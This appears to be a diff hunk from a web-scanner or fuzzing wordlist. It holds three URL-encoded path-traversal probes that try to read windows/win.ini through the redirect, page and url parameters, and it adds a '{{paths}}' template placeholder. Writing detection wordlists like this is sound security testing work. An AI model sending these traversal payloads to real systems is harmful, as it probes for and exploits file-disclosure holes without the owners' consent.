@@ -8,3 +8,4 @@
 /?redirect=..%2f..%2f..%2f..%2fwindows/win.ini
 /?page=..%2f..%2f..%2f..%2f..%2fwindows/win.ini
 /?url=..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini
+{{paths}}
